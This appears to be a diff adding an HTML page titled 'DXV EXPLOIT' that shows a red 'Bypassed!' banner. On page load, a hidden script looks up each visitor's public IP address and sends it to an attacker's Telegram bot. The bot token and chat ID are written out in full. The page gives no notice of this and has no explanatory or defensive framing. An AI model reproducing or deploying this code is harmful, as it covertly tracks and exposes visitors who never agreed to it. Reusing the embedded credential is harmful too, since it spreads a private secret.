@@ -1,0 +1,49 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0">
+    <title>DXV EXPLOIT</title>
+    <link href="../assets/toastr/toastr.min.css" rel="stylesheet" type="text/css" />
+    <style>
+        body {
+            background-color: black;
+            color: white;
+            font-family: Arial, sans-serif;
+        }
+        .alert-danger {
+            color: red;
+        }
+        .alert-success {
+            color: lime;
+        }
+    </style>
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            fetch('https://api64.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ipAddress = data.ip;
+                    const botToken = '6865521894:AAGvDoWy0kEHyC_GGGF9hoZzHsEEkwyxucY';
+                    const chatId = '5917899680';
+                    
+                    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=IP Address: ${ipAddress}`;
+                    
+                    fetch(url);
+                });
+        });
+    </script>
+</head>
+<body>
+    <section id="main-content">
+        <section class="wrapper">
+            <div class="row">
+                <div class="alert alert-danger">
+                    <strong>Bypassed!</strong>
+                </div>
+            </div>
+        </section>
+    </section>
+</body>
+</html>
